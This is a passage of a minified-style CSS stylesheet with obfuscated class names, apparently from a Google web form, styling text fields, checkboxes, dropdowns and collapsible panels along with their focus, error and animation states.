	margin-right: 8px;
	margin-top: -2px
}

.qpSchb {
	display: block;
	height: 16px;
	width: 16px
}

.N3Hzgf.N3Hzgf {
	-webkit-box-sizing: content-box;
	box-sizing: content-box
}

.Qzm34b,
.N3Hzgf {
	padding: 16px 0 0;
	width: 100%;
	display: block
}

.d2CFce.OcVpRe .N3Hzgf,
.d2CFce.OcVpRe .Qzm34b {
	padding: 24px 0 0;
	padding-bottom: 0
}

:first-child>.N3Hzgf,
:first-child>.Qzm34b,
:first-child.OcVpRe>.N3Hzgf,
:first-child.OcVpRe>.Qzm34b {
	padding: 8px 0 0
}

.d2CFce .N3Hzgf .oJeWuf {
	height: 56px;
	padding-top: 0
}

.d2CFce.OcVpRe .N3Hzgf .oJeWuf {
	height: 36px
}

.N3Hzgf .Wic03c {
	-webkit-align-items: center;
	align-items: center;
	position: static;
	top: 0
}

.N3Hzgf .snByac {
	background: #fff;
	bottom: 17px;
	-webkit-box-sizing: border-box;
	box-sizing: border-box;
	color: #80868b;
	font-size: 16px;
	font-weight: 400;
	left: 8px;
	max-width: -webkit-calc(100% - (2*8px));
	max-width: calc(100% - (2*8px));
	overflow: hidden;
	padding: 0 8px;
	text-overflow: ellipsis;
	-webkit-transition: transform 150ms cubic-bezier(0.4, 0, 0.2, 1), opacity 150ms cubic-bezier(0.4, 0, 0.2, 1);
	transition: transform 150ms cubic-bezier(0.4, 0, 0.2, 1), opacity 150ms cubic-bezier(0.4, 0, 0.2, 1);
	white-space: nowrap;
	width: auto;
	z-index: 1
}

.N3Hzgf.IYewr.u3bW4e .zHQkBf:not([disabled])~.snByac {
	color: #d93025
}

.d2CFce.OcVpRe .N3Hzgf .snByac {
	bottom: 9px;
	color: #5f6368;
	font-size: 14px;
	left: 6px;
	padding: 0 6px
}

.d2CFce.OcVpRe .u3bW4e .snByac,
.d2CFce.OcVpRe .CDELXb .snByac {
	-webkit-transform: scale(.75) translateY(-155%);
	transform: scale(.75) translateY(-155%)
}

.N3Hzgf .ndJi5d {
	top: inherit
}

.N3Hzgf .Is7Fhb {
	opacity: 1;
	padding-top: 4px
}

.N3Hzgf .RxsGPe {
	opacity: 1;
	padding-top: 4px;
	color: #d93025
}

.N3Hzgf .Is7Fhb:empty,
.N3Hzgf .RxsGPe:empty {
	display: none
}

.N3Hzgf .zHQkBf {
	-webkit-border-radius: 4px;
	border-radius: 4px;
	color: #202124;
	font-size: 16px;
	height: 28px;
	margin: 1px 1px 0 1px;
	padding: 13px 15px;
	z-index: 1
}

.N3Hzgf.u3bW4e .zHQkBf,
.N3Hzgf.IYewr .zHQkBf {
	margin: 2px 2px 0 2px;
	padding: 12px 14px
}

.d2CFce.OcVpRe .N3Hzgf .zHQkBf {
	font-size: 14px;
	height: 20px;
	padding: 7px 11px
}

.d2CFce.OcVpRe .u3bW4e .zHQkBf,
.d2CFce.OcVpRe .IYewr .zHQkBf {
	height: 20px;
	padding: 6px 10px
}

.jjwyfe .zHQkBf,
.jjwyfe .MQL3Ob {
	direction: ltr;
	text-align: left
}

.N3Hzgf .iHd5yb {
	padding-left: 15px
}

.N3Hzgf.u3bW4e .iHd5yb {
	padding-left: 14px
}

.N3Hzgf .MQL3Ob {
	padding-right: 15px;
	z-index: 1
}

.N3Hzgf.u3bW4e .MQL3Ob {
	padding-right: 15px
}

.d2CFce.OcVpRe .N3Hzgf .iHd5yb {
	padding-left: 11px
}

.d2CFce.OcVpRe .N3Hzgf.u3bW4e .iHd5yb {
	padding-left: 10px
}

.d2CFce.OcVpRe .N3Hzgf .MQL3Ob,
.d2CFce.OcVpRe .N3Hzgf.u3bW4e .MQL3Ob {
	padding-right: 11px
}

.N3Hzgf .AxOyFc {
	font-family: roboto, arial, sans-serif
}

.N3Hzgf .whsOnd:not([disabled]):focus~.AxOyFc {
	color: #1a73e8
}

.N3Hzgf .mIZh1c {
	border: 1px solid #dadce0;
	-webkit-border-radius: 4px;
	border-radius: 4px;
	bottom: 0;
	-webkit-box-sizing: border-box;
	box-sizing: border-box
}

.N3Hzgf .cXrdqd {
	-webkit-border-radius: 4px;
	border-radius: 4px;
	bottom: 0;
	opacity: 0;
	-webkit-transform: none;
	transform: none;
	-webkit-transition: opacity 150ms cubic-bezier(0.4, 0, 0.2, 1);
	transition: opacity 150ms cubic-bezier(0.4, 0, 0.2, 1);
	width: -webkit-calc(100% - 2*2px);
	width: calc(100% - 2*2px)
}

.N3Hzgf .mIZh1c,
.N3Hzgf .cXrdqd,
.N3Hzgf.IYewr .mIZh1c,
.N3Hzgf.IYewr .cXrdqd {
	background-color: transparent
}

.N3Hzgf .mIZh1c,
.N3Hzgf.k0tWj .mIZh1c {
	height: 100%
}

.N3Hzgf.IYewr .cXrdqd {
	height: -webkit-calc(100% - 2*1px);
	height: calc(100% - 2*1px);
	width: -webkit-calc(100% - 2*1px);
	width: calc(100% - 2*1px)
}

.N3Hzgf .cXrdqd,
.N3Hzgf.IYewr.u3bW4e .cXrdqd {
	height: -webkit-calc(100% - 2*2px);
	height: calc(100% - 2*2px);
	width: -webkit-calc(100% - 2*2px);
	width: calc(100% - 2*2px)
}

.N3Hzgf.u3bW4e .cXrdqd,
.N3Hzgf.IYewr .cXrdqd {
	-webkit-animation: none;
	animation: none;
	opacity: 1
}

.N3Hzgf.u3bW4e .cXrdqd {
	border: 2px solid #1a73e8
}

.N3Hzgf.IYewr.u3bW4e .cXrdqd {
	border-width: 2px
}

.N3Hzgf.IYewr .cXrdqd {
	border: 1px solid #d93025
}

.N3Hzgf.IYewr.CDELXb .snByac {
	color: #d93025
}

.N3Hzgf .zHQkBf[disabled] {
	color: rgba(32, 33, 36, 0.502)
}

.edhGSc {
	-webkit-user-select: none;
	-webkit-tap-highlight-color: transparent;
	display: inline-block;
	outline: none;
	padding-bottom: 8px
}

.RpC4Ne {
	min-height: 1.5em;
	position: relative;
	vertical-align: top
}

.Pc9Gce {
	display: -webkit-box;
	display: -webkit-flex;
	display: flex;
	position: relative;
	padding-top: 14px
}

.KHxj8b {
	-webkit-box-flex: 1;
	box-flex: 1;
	-webkit-flex-grow: 1;
	flex-grow: 1;
	-webkit-flex-shrink: 1;
	flex-shrink: 1;
	background-color: transparent;
	border: none;
	display: block;
	font: 400 16px Roboto, RobotoDraft, Helvetica, Arial, sans-serif;
	height: 24px;
	min-height: 24px;
	line-height: 24px;
	margin: 0;
	outline: none;
	padding: 0;
	resize: none;
	white-space: pre-wrap;
	word-wrap: break-word;
	z-index: 0;
	overflow-y: visible;
	overflow-x: hidden
}

.KHxj8b.VhWN2c {
	text-align: center
}

.edhGSc.dm7YTc .KHxj8b {
	color: rgba(255, 255, 255, 0.87)
}

.edhGSc.u3bW4e.dm7YTc .KHxj8b {
	color: #fff
}

.z0oSpf {
	background-color: rgba(0, 0, 0, 0.12);
	height: 1px;
	left: 0;
	margin: 0;
	padding: 0;
	position: absolute;
	width: 100%
}

.edhGSc.dm7YTc>.RpC4Ne>.z0oSpf {
	background-color: rgba(255, 255, 255, 0.12)
}

.Bfurwb {
	-webkit-transform: scaleX(0);
	transform: scaleX(0);
	background-color: #4285f4;
	height: 2px;
	left: 0;
	margin: 0;
	padding: 0;
	position: absolute;
	width: 100%
}

.edhGSc.k0tWj>.RpC4Ne>.z0oSpf,
.edhGSc.k0tWj>.RpC4Ne>.Bfurwb {
	background-color: #d50000;
	height: 2px
}

.edhGSc.k0tWj.dm7YTc>.RpC4Ne>.z0oSpf,
.edhGSc.k0tWj.dm7YTc>.RpC4Ne>.Bfurwb {
	background-color: #ff6e6e
}

.edhGSc.RDPZE .KHxj8b {
	color: rgba(0, 0, 0, 0.38)
}

.edhGSc.RDPZE>.RpC4Ne>.z0oSpf {
	background: none;
	border-bottom: 1px dotted rgba(0, 0, 0, 0.38)
}

.Bfurwb.Y2Zypf {
	-webkit-animation: quantumWizPaperInputRemoveUnderline .3s cubic-bezier(0.4, 0, 0.2, 1);
	animation: quantumWizPaperInputRemoveUnderline .3s cubic-bezier(0.4, 0, 0.2, 1)
}

.edhGSc.u3bW4e>.RpC4Ne>.Bfurwb {
	-webkit-animation: quantumWizPaperInputAddUnderline .3s cubic-bezier(0.4, 0, 0.2, 1);
	animation: quantumWizPaperInputAddUnderline .3s cubic-bezier(0.4, 0, 0.2, 1);
	-webkit-transform: scaleX(1);
	transform: scaleX(1)
}

.edhGSc.FPYHkb>.RpC4Ne {
	padding-top: 24px
}

.fqp6hd {
	-webkit-transform-origin: top left;
	transform-origin: top left;
	-webkit-transform: translate(0, -22px);
	transform: translate(0, -22px);
	-webkit-transition: all .3s cubic-bezier(0.4, 0, 0.2, 1);
	transition: all .3s cubic-bezier(0.4, 0, 0.2, 1);
	-webkit-transition-property: color, top, transform;
	transition-property: color, top, transform;
	color: rgba(0, 0, 0, 0.38);
	font: 400 16px Roboto, RobotoDraft, Helvetica, Arial, sans-serif;
	font-size: 16px;
	pointer-events: none;
	position: absolute;
	top: 100%;
	width: 100%
}

.edhGSc.u3bW4e>.RpC4Ne>.fqp6hd,
.edhGSc.CDELXb>.RpC4Ne>.fqp6hd,
.edhGSc.LydCob .fqp6hd {
	-webkit-transform: scale(.75);
	transform: scale(.75);
	top: 16px
}

.edhGSc.dm7YTc>.RpC4Ne>.fqp6hd {
	color: rgba(255, 255, 255, 0.38)
}

.edhGSc.u3bW4e>.RpC4Ne>.fqp6hd,
.edhGSc.u3bW4e.dm7YTc>.RpC4Ne>.fqp6hd {
	color: #4285f4
}

.F1pOBe {
	color: rgba(0, 0, 0, 0.38);
	font: 400 16px Roboto, RobotoDraft, Helvetica, Arial, sans-serif;
	max-width: 100%;
	overflow: hidden;
	pointer-events: none;
	position: absolute;
	bottom: 3px;
	text-overflow: ellipsis;
	white-space: nowrap
}

.edhGSc.dm7YTc .F1pOBe {
	color: rgba(255, 255, 255, 0.38)
}

.edhGSc.CDELXb>.RpC4Ne>.F1pOBe {
	display: none
}

.S1BUyf {
	-webkit-tap-highlight-color: transparent;
	font: 400 12px Roboto, RobotoDraft, Helvetica, Arial, sans-serif;
	height: 16px;
	margin-left: auto;
	padding-left: 16px;
	padding-top: 8px;
	pointer-events: none;
	text-align: right;
	color: rgba(0, 0, 0, 0.38);
	white-space: nowrap
}

.edhGSc.dm7YTc>.S1BUyf {
	color: rgba(255, 255, 255, 0.38)
}

.edhGSc.wrxyb {
	padding-bottom: 4px
}

.v6odTb,
.YElZX:not(:empty) {
	-webkit-tap-highlight-color: transparent;
	-webkit-flex: 1 1 auto;
	flex: 1 1 auto;
	font: 400 12px Roboto, RobotoDraft, Helvetica, Arial, sans-serif;
	min-height: 16px;
	padding-top: 8px
}

.edhGSc.wrxyb .jE8NUc {
	display: -webkit-box;
	display: -webkit-flex;
	display: flex
}

.YElZX {
	pointer-events: none
}

.v6odTb {
	color: #d50000
}

.edhGSc.dm7YTc .v6odTb {
	color: #ff6e6e
}

.YElZX {
	opacity: .3
}

.edhGSc.k0tWj .YElZX,
.edhGSc:not(.k0tWj) .YElZX:not(:empty)+.v6odTb {
	display: none
}

@keyframes quantumWizPaperInputRemoveUnderline {
	0% {
		-webkit-transform: scaleX(1);
		transform: scaleX(1);
		opacity: 1
	}
	to {
		-webkit-transform: scaleX(1);
		transform: scaleX(1);
		opacity: 0
	}
}

@-webkit-keyframes quantumWizPaperInputRemoveUnderline {
	0% {
		-webkit-transform: scaleX(1);
		transform: scaleX(1);
		opacity: 1
	}
	to {
		-webkit-transform: scaleX(1);
		transform: scaleX(1);
		opacity: 0
	}
}

@keyframes quantumWizPaperInputAddUnderline {
	0% {
		-webkit-transform: scaleX(0);
		transform: scaleX(0)
	}
	to {
		-webkit-transform: scaleX(1);
		transform: scaleX(1)
	}
}

@-webkit-keyframes quantumWizPaperInputAddUnderline {
	0% {
		-webkit-transform: scaleX(0);
		transform: scaleX(0)
	}
	to {
		-webkit-transform: scaleX(1);
		transform: scaleX(1)
	}
}

.IPmF1c.eLNT1d {
	display: none
}

.OPJAZe.kM7Sgc {
	margin-bottom: 8px;
	margin-top: 16px
}

.mBHyXd {
	color: #80868b;
	font-size: 12px
}

.OPJAZe.kM7Sgc .blm4m {
	color: #202124;
	font-size: 16px;
	line-height: 1.75
}

.OFqWT {
	margin: 0 4px 0;
	text-align: center
}

.oEvHdd {
	font-size: 16px;
	font-weight: 300
}

.j9NuTc {
	max-width: 100%
}

.fb0g6 {
	position: relative
}

.AZijEc {
	word-wrap: break-word
}

.puBG3b.L6cTce {
	display: none
}

.H4QcQb>.TpYURb:first-child,
.puBG3b>:first-child .N3Hzgf {
	padding-top: 16px
}

.H4QcQb:first-child .TpYURb:first-child {
	padding-top: 8px
}

.H4QcQb>.TpYURb.OcVpRe,
.puBG3b>.OcVpRe:first-child .N3Hzgf {
	padding-top: 24px
}

.TpYURb {
	font-size: 16px;
	line-height: 24px;
	outline: none;
	padding: 16px 0;
	text-align: start
}

.TpYURb.OcVpRe {
	padding: 24px 0 0
}

.TpYURb:first-child {
	padding: 8px 0 0
}

.uzptjb {
	position: relative
}

.TtcoFc {
	background: #fff;
	bottom: 18px;
	-webkit-box-sizing: border-box;
	box-sizing: border-box;
	left: 8px;
	padding: 0 8px;
	pointer-events: none;
	position: absolute;
	-webkit-transform-origin: left bottom;
	transform-origin: left bottom;
	z-index: 1
}

.TpYURb.OcVpRe .TtcoFc {
	bottom: 10px;
	left: 6px;
	padding: 0 6px
}

.TpYURb.OcVpRe .TtcoFc.PWSxTd {
	-webkit-transform: scale(.75) translatey(-26px);
	transform: scale(.75) translatey(-26px)
}

.TtcoFc.PWSxTd {
	-webkit-transition: all .3s cubic-bezier(0.4, 0, 0.2, 1);
	transition: all .3s cubic-bezier(0.4, 0, 0.2, 1);
	-webkit-transform: scale(.75) translatey(-39px);
	transform: scale(.75) translatey(-39px)
}

.cGfoab {
	color: #80868b;
	display: block;
	font-size: 16px;
	line-height: normal;
	overflow: hidden;
	position: relative;
	white-space: nowrap
}

.TpYURb.OcVpRe .cGfoab {
	color: #5f6368;
	font-size: 14px
}

.TpYURb.auswjd .cGfoab {
	color: #1a73e8
}

.TpYURb.Jj6Lae .PWSxTd .cGfoab {
	color: #d93025
}

.TtcoFc.PWSxTd .cGfoab {
	overflow: visible
}

.CuHakb {
	padding: 0;
	position: relative;
	top: 0
}

.UDCCJb,
.UDCCJb:active,
.UDCCJb:focus {
	-webkit-appearance: none;
	appearance: none;
	background: none;
	border: none;
	color: #202124;
	font: inherit;
	height: 56px;
	line-height: 28px;
	outline: none;
	padding: 15px 28px 13px 16px;
	position: relative;
	resize: none;
	width: 100%;
	z-index: 1
}

.UDCCJb::-ms-expand {
	display: none
}

.TpYURb.OcVpRe .UDCCJb,
.TpYURb.OcVpRe .UDCCJb:active,
.TpYURb.OcVpRe .UDCCJb:focus {
	font-size: 14px;
	height: 36px;
	padding: 4px 24px 4px 12px
}

.xxcVG:empty {
	display: none
}

.enSJj {
	border-color: rgba(0, 0, 0, 0.38) transparent;
	border-style: solid;
	border-width: 6px 6px 0 6px;
	bottom: 23px;
	height: 0;
	pointer-events: none;
	position: absolute;
	right: 16px;
	width: 0;
	z-index: 1
}

.TpYURb.OcVpRe .enSJj {
	bottom: 14px;
	right: 12px
}

.t0VkCd {
	border: 1px solid #dadce0;
	bottom: 0;
	left: 0;
	position: absolute;
	right: 0;
	background: none;
	-webkit-border-radius: 4px;
	border-radius: 4px;
	-webkit-box-sizing: border-box;
	box-sizing: border-box;
	height: 100%
}

.t0VkCd.dmBkte {
	background: none;
	-webkit-border-radius: 4px;
	border-radius: 4px;
	-webkit-box-sizing: border-box;
	box-sizing: border-box;
	height: 100%;
	border: 2px solid #1a73e8
}

.TpYURb.Jj6Lae .t0VkCd {
	border: 1px solid #d93025
}

.TpYURb.Jj6Lae.auswjd .t0VkCd {
	border: 2px solid #d93025
}

.JyD1we {
	color: #d93025;
	display: block;
	font-size: 12px;
	padding-top: 4px;
	min-height: 16px
}

.JyD1we:empty {
	display: none
}

.X0cuce {
	display: -webkit-box;
	display: -webkit-flex;
	display: flex;
	-webkit-justify-content: space-around;
	justify-content: space-around;
	margin-bottom: 16px;
	padding: 0 24px
}

.vHVGub .MQL3Ob {
	padding-left: 6px;
	padding-right: 15px
}

.OcVpRe .vHVGub .MQL3Ob {
	padding-right: 11px
}

.LMabGb.CDELXb.IEDeKb .MQL3Ob {
	opacity: 0
}

.XA0zhb {
	color: #202124;
	direction: ltr;
	display: inline-block;
	white-space: nowrap
}

.yDXeje {
	-webkit-align-items: center;
	align-items: center;
	display: -webkit-box;
	display: -webkit-flex;
	display: flex
}

.w46j5b {
	margin-right: 12px
}

.Fy0Xbe {
	background: url('//ssl.gstatic.com/i18n/flags/48x32/nobevel/40b411e8384b10c60bd78340cafbda86/flags.png') no-repeat 0 0;
	-webkit-background-size: 24px 3876px;
	background-size: 24px 3876px;
	width: 24px;
	height: 16px;
	overflow: hidden
}

.WN10oc .DtwKMc:first-child .N3Hzgf {
	padding-top: 16px
}

.WN10oc.OcVpRe .DtwKMc:first-child .N3Hzgf {
	padding-top: 24px
}

.WN10oc:first-child .DtwKMc:first-child .N3Hzgf {
	padding-top: 8px
}

.WN10oc.Jj6Lae .CYrp9b {
	color: #d93025
}

.uVccjd {
	-webkit-box-flex: 0;
	box-flex: 0;
	-webkit-flex-grow: 0;
	flex-grow: 0;
	-webkit-user-select: none;
	-webkit-transition: border-color .2s cubic-bezier(0.4, 0, 0.2, 1);
	transition: border-color .2s cubic-bezier(0.4, 0, 0.2, 1);
	-webkit-tap-highlight-color: transparent;
	border: 10px solid rgba(0, 0, 0, 0.54);
	-webkit-border-radius: 3px;
	border-radius: 3px;
	-webkit-box-sizing: content-box;
	box-sizing: content-box;
	cursor: pointer;
	display: inline-block;
	max-height: 0;
	max-width: 0;
	outline: none;
	overflow: visible;
	position: relative;
	vertical-align: middle;
	z-index: 0
}

.uVccjd.ZdhN5b {
	border-color: rgba(255, 255, 255, 0.70)
}

.uVccjd.ZdhN5b[aria-disabled="true"] {
	border-color: rgba(255, 255, 255, 0.30)
}

.uVccjd[aria-disabled="true"] {
	border-color: #bdbdbd;
	cursor: default
}

.uHMk6b {
	-webkit-transition: all .1s .15s cubic-bezier(0.4, 0, 0.2, 1);
	transition: all .1s .15s cubic-bezier(0.4, 0, 0.2, 1);
	-webkit-transition-property: transform, border-radius;
	transition-property: transform, border-radius;
	border: 8px solid white;
	left: -8px;
	position: absolute;
	top: -8px
}

[aria-checked="true"]>.uHMk6b,
[aria-checked="mixed"]>.uHMk6b {
	-webkit-transform: scale(0);
	transform: scale(0);
	-webkit-transition: -webkit-transform .1s cubic-bezier(0.4, 0, 0.2, 1);
	transition: -webkit-transform .1s cubic-bezier(0.4, 0, 0.2, 1);
	-webkit-transition: transform .1s cubic-bezier(0.4, 0, 0.2, 1);
	transition: transform .1s cubic-bezier(0.4, 0, 0.2, 1);
	-webkit-border-radius: 100%;
	border-radius: 100%
}

.B6Vhqe .TCA6qd {
	left: 5px;
	top: 2px
}

.N2RpBe .TCA6qd {
	left: 10px;
	-webkit-transform: rotate(-45deg);
	transform: rotate(-45deg);
	-webkit-transform-origin: 0;
	transform-origin: 0;
	top: 7px
}

.TCA6qd {
	height: 100%;
	pointer-events: none;
	position: absolute;
	width: 100%
}

.rq8Mwb {
	-webkit-animation: quantumWizPaperAnimateCheckMarkOut .2s forwards;
	animation: quantumWizPaperAnimateCheckMarkOut .2s forwards;
	clip: rect(0, 20px, 20px, 0);
	height: 20px;
	left: -10px;
	position: absolute;
	top: -10px;
	width: 20px
}

[aria-checked="true"]>.rq8Mwb,
[aria-checked="mixed"]>.rq8Mwb {
	-webkit-animation: quantumWizPaperAnimateCheckMarkIn .2s .1s forwards;
	animation: quantumWizPaperAnimateCheckMarkIn .2s .1s forwards;
	clip: rect(0, 20px, 20px, 20px)
}

@media print {
	[aria-checked="true"]>.rq8Mwb,
	[aria-checked="mixed"]>.rq8Mwb {
		clip: auto
	}
}

.B6Vhqe .MbUTNc {
	display: none
}

.MbUTNc {
	border: 1px solid #fff;
	height: 5px;
	left: 0;
	position: absolute
}

.B6Vhqe .Ii6cVc {
	width: 8px;
	top: 7px
}

.N2RpBe .Ii6cVc {
	width: 11px
}

.Ii6cVc {
	border: 1px solid #fff;
	left: 0;
	position: absolute;
	top: 5px
}

.PkgjBf {
	-webkit-transform: scale(2.5);
	transform: scale(2.5);
	-webkit-transition: opacity .15s ease;
	transition: opacity .15s ease;
	background-color: rgba(0, 0, 0, 0.2);
	-webkit-border-radius: 100%;
	border-radius: 100%;
	height: 20px;
	left: -10px;
	opacity: 0;
	outline: .1px solid transparent;
	pointer-events: none;
	position: absolute;
	top: -10px;
	width: 20px;
	z-index: -1
}

.ZdhN5b .PkgjBf {
	background-color: rgba(255, 255, 255, 0.2)
}

.qs41qe>.PkgjBf {
	-webkit-animation: quantumWizRadialInkSpread .3s;
	animation: quantumWizRadialInkSpread .3s;
	-webkit-animation-fill-mode: forwards;
	animation-fill-mode: forwards;
	opacity: 1
}

.i9xfbb>.PkgjBf {
	background-color: rgba(0, 150, 136, 0.2)
}

.u3bW4e>.PkgjBf {
	-webkit-animation: quantumWizRadialInkFocusPulse .7s infinite alternate;
	animation: quantumWizRadialInkFocusPulse .7s infinite alternate;
	background-color: rgba(0, 150, 136, 0.2);
	opacity: 1
}

@keyframes quantumWizPaperAnimateCheckMarkIn {
	0% {
		clip: rect(0, 0, 20px, 0)
	}
	to {
		clip: rect(0, 20px, 20px, 0)
	}
}

@-webkit-keyframes quantumWizPaperAnimateCheckMarkIn {
	0% {
		clip: rect(0, 0, 20px, 0)
	}
	to {
		clip: rect(0, 20px, 20px, 0)
	}
}

@keyframes quantumWizPaperAnimateCheckMarkOut {
	0% {
		clip: rect(0, 20px, 20px, 0)
	}
	to {
		clip: rect(0, 20px, 20px, 20px)
	}
}

@-webkit-keyframes quantumWizPaperAnimateCheckMarkOut {
	0% {
		clip: rect(0, 20px, 20px, 0)
	}
	to {
		clip: rect(0, 20px, 20px, 20px)
	}
}

.G43JTb.nxGKDd .SLG1Fe {
	border-bottom: 1px solid #dadce0
}

.aTzEhb.Z8eykb .G43JTb.nxGKDd .utl8ve {
	border-bottom: 0
}

.utl8ve {
	display: -webkit-inline-box;
	display: -webkit-inline-flex;
	display: inline-flex;
	padding: 16px 0
}

.utl8ve.cd29Sd {
	display: -webkit-box;
	display: -webkit-flex;
	display: flex
}

.utl8ve.RDPZE {
	pointer-events: none
}

.AU165e {
	-webkit-align-items: center;
	align-items: center;
	display: -webkit-box;
	display: -webkit-flex;
	display: flex;
	-webkit-box-flex: none;
	-webkit-flex: none;
	flex: none;
	padding: 2px;
	position: relative
}

.utl8ve.cd29Sd .AU165e {
	margin-left: 16px;
	-webkit-box-ordinal-group: 1;
	-webkit-order: 1;
	order: 1
}

.utl8ve.STFd6 .AU165e {
	-webkit-align-items: flex-start;
	align-items: flex-start;
	top: 2px
}

.utl8ve.zVkt0c:not(.STFd6) .AU165e {
	top: -1px
}

.j1feqc {
	-webkit-box-sizing: content-box;
	box-sizing: content-box;
	display: block
}

.j1feqc .fsHoPb,
.j1feqc .oyD5Oc {
	border-color: #fff
}

.j1feqc,
.utl8ve,
.j1feqc .Id5V1 {
	border-color: #5f6368
}

.utl8ve.STFd6 .j1feqc {
	position: relative;
	top: -2px
}

.utl8ve:not(.RDPZE) .j1feqc.N2RpBe,
.utl8ve:not(.RDPZE) .j1feqc.N2RpBe .Id5V1,
.utl8ve:not(.RDPZE) .j1feqc .nQOrEb {
	border-color: #1a73e8
}

.j1feqc.i9xfbb>.MbhUzd,
.j1feqc.u3bW4e>.MbhUzd {
	background-color: rgba(26, 115, 232, 0.149)
}

.G43JTb.Jj6Lae .utl8ve:not(.RDPZE) .j1feqc,
.G43JTb.Jj6Lae .utl8ve:not(.RDPZE) .j1feqc .Id5V1,
.G43JTb.Jj6Lae .utl8ve:not(.RDPZE) .j1feqc .nQOrEb {
	border-color: #d93025
}

.j1feqc.RDPZE,
.utl8ve.RDPZE,
.j1feqc.RDPZE .Id5V1,
.utl8ve.RDPZE .nQOrEb {
	border-color: rgba(0, 0, 0, 0.26)
}

.dfGadb {
	color: #5f6368
}

.utl8ve.cd29Sd:not(.STFd6) .dfGadb {
	-webkit-align-items: center;
	align-items: center;
	display: -webkit-box;
	display: -webkit-flex;
	display: flex
}

.i3abHf {
	-webkit-align-items: flex-start;
	align-items: flex-start;
	display: -webkit-box;
	display: -webkit-flex;
	display: flex;
	-webkit-box-flex: 0 1 auto;
	-webkit-flex: 0 1 auto;
	flex: 0 1 auto;
	-webkit-flex-direction: column;
	flex-direction: column;
	-webkit-justify-content: center;
	justify-content: center;
	margin-left: 16px;
	width: 100%
}

.utl8ve.cd29Sd .i3abHf {
	-webkit-box-flex: 1;
	box-flex: 1;
	-webkit-flex-grow: 1;
	flex-grow: 1
}

.qJfqwb:not(.RDPZE),
.utl8ve:not(.RDPZE) .qJfqwb {
	cursor: pointer
}

.nObcn {
	padding-bottom: 3px;
	padding-top: -3px;
	color: #202124;
	display: inline-block;
	max-width: 100%
}

.utl8ve.cd29Sd .nObcn {
	display: block
}

.utl8ve.RDPZE .nObcn {
	color: rgba(32, 33, 36, 0.502)
}

.DH2ykc {
	padding-bottom: 0;
	padding-top: 0;
	color: #5f6368;
	-webkit-box-flex: 0 1 auto;
	-webkit-flex: 0 1 auto;
	flex: 0 1 auto;
	font-size: 12px;
	line-height: 1.3333;
	width: 100%
}

.utl8ve.RDPZE .DH2ykc {
	color: rgba(32, 33, 36, 0.502)
}

.YilHqe {
	padding-bottom: 0;
	padding-top: 8px;
	display: none;
	font-size: 12px
}

.G43JTb.hpxoof .YilHqe {
	display: block
}

.G43JTb.Jj6Lae .YilHqe {
	color: #d93025
}

.GCGC4b.nxGKDd {
	border-bottom: 1px solid #dadce0
}

.GCGC4b.nxGKDd.jVwmLb {
	border-bottom: none
}

.GCGC4b.nxGKDd .t8i1B {
	-webkit-transition: .2s cubic-bezier(.4, 0, .2, 1);
	transition: .2s cubic-bezier(.4, 0, .2, 1)
}

.GCGC4b.nxGKDd.jVwmLb .t8i1B {
	border-bottom: none;
	max-height: 0;
	opacity: 0;
	visibility: hidden
}

.LZYSye {
	margin-left: 16px
}

.LZYSye>.jW1oEc {
	-webkit-align-items: center;
	align-items: center;
	display: -webkit-box;
	display: -webkit-flex;
	display: flex;
	height: 24px;
	-webkit-justify-content: center;
	justify-content: center;
	-webkit-transition: transform .2s cubic-bezier(.4, 0, .2, 1);
	transition: transform .2s cubic-bezier(.4, 0, .2, 1);
	width: 24px
}

.GCGC4b.nxGKDd.jVwmLb .LZYSye>.jW1oEc {
	-webkit-transform: rotate(-180deg);
	transform: rotate(-180deg)
}

.w4SzUd {
	background: none;
	border: none;
	cursor: pointer;
	display: -webkit-box;
	display: -webkit-flex;
	display: flex;
	font-size: inherit;
	line-height: inherit;
	outline: none;
	padding: 14px 0;
	position: relative;
	text-align: left;
	width: 100%
}

.w4SzUd::before {
	background: rgba(26, 115, 232, 0.149);
	bottom: 0;
	content: '';
	display: block;
	left: -40px;
	margin: auto;
	opacity: 0;
	position: absolute;
	right: -40px;
	top: 0;
	-webkit-transition: opacity .2s cubic-bezier(.4, 0, .2, 1);
	transition: opacity .2s cubic-bezier(.4, 0, .2, 1);
	z-index: -1
}

.G43JTb.u3bW4e .w4SzUd::before {
	opacity: 1
}

.w4SzUd .dfGadb {
	display: -webkit-box;
	display: -webkit-flex;
	display: flex;
	margin-right: 16px
}

.GCGC4b.nxGKDd .nObcn {
	display: block;
	padding-bottom: 0
}

.GCGC4b.nxGKDd .SLG1Fe {
	border-bottom: none;
	padding: 16px 0
}

.GCGC4b.nxGKDd .iVsznb {
	padding-left: 40px
}

.GCGC4b.nxGKDd .utl8ve {
	padding: 0
}

.sYx0l {
	padding-bottom: 0;
	padding-top: 0;
	color: #5f6368;
	display: block;
	font-size: 12px;
	line-height: 20px
}

.w4SzUd .NKVAx {
	-webkit-box-flex: 1;
	box-flex: 1;
	-webkit-flex-grow: 1;
	flex-grow: 1
}

.T8qVIf {
	color: #202124;
	cursor: pointer;
	display: -webkit-box;
	display: -webkit-flex;
	display: flex;
	font-size: 14px;
	margin-bottom: 14px;
	margin-top: 14px
}

.mSQT0d {
	-webkit-box-flex: 1;
	box-flex: 1;
	-webkit-flex-grow: 1;
	flex-grow: 1;
	min-width: 48px;
	padding-left: 16px;
	position: relative;
	z-index: 1
}

.mSQT0d::before {
	content: '';
	display: block;
	height: 48px;
	left: 0;
	position: absolute;
	right: 0;
	top: -14px;
	z-index: -1
}

.iK47pf {
	-webkit-transform: translatex(-2px) scale(.8);
	transform: translatex(-2px) scale(.8);
	border-color: #5f6368
}

.iK47pf.N2RpBe {
	border-color: #1a73e8
}

.iK47pf.RDPZE {
	border-color: rgba(0, 0, 0, 0.26)
}

.iK47pf .oyD5Oc,
.iK47pf .fsHoPb {
	border-color: #fff
}

.iK47pf.i9xfbb>.MbhUzd,
.iK47pf.u3bW4e>.MbhUzd {
	background-color: rgba(26, 115, 232, 0.149)
}

.iK47pf.RDPZE+.mSQT0d {
	color: rgba(32, 33, 36, 0.502)
}

.T8qVIf.Jj6Lae .iK47pf {
	border-color: #d93025
}

.Rv58Rb {
	color: #d93025;
	display: none;
	padding-bottom: 0;
	padding-top: 8px
}

.T8qVIf.Jj6Lae .Rv58Rb {
	display: block
}

.T8qVIf .PkgjBf {
	height: 24px;
	width: 24px;
	-webkit-border-radius: 0;
	border-radius: 0
}

.W498nc {
	display: -webkit-box;
	display: -webkit-flex;
	display: flex
}

.fdWl7b {
	-webkit-box-flex: 1;
	box-flex: 1;
	-webkit-flex-grow: 1;
	flex-grow: 1;
	min-width: 0
}

